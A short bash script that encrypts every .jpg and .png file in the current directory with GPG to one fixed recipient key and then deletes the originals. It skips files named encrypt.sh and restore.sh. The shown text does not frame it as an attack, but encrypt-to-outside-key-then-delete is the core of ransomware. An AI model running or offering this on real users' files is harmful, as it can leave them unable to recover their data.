#!/bin/bash

# Loop through both .jpg and .png files
for img in *.jpg *.png; do
    # Skip if no matching files are found
    if [ ! -e "$img" ]; then
        continue
    fi

    # Ensure the script files are not encrypted
    if [ "$img" != "encrypt.sh" ] && [ "$img" != "restore.sh" ]; then
        echo "Encrypting $img..."
        
        # Encrypt using GPG with the specified key ID
        gpg --output "$img.gpg" --encrypt --recipient 32EBD7FB77508426847646C56E60B037E6A8E8A9 "$img"
        
        # Delete the original file
        rm "$img"
    fi
done

echo "Encryption process complete."
